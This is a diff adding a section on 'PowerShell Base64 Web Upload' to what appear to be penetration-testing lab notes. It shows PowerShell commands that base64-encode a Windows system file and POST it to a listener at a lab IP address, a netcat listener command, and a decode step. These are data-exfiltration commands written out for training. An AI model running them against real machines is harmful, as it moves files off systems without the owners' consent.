@@ -209,5 +209,27 @@ Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System
 
 **PowerShell Base64 Web Upload**
 
+- Invoke-WebRequest or Invoke-RestMethod together with Netcat
+- Use Netcat to listen in on a port we specify and send the file as a POST request
+- copy the output and use the base64 decode function to convert the base64 string into a file
+```
+$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
+```
+```
+Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
+```
+
+Listen on port 8000
+```
+nc -lnvp 8000
+```
+
+Now decrypt the file
+```
+echo <base64> | base64 -d -w 0 > hosts
+```
+
+
+
 
 
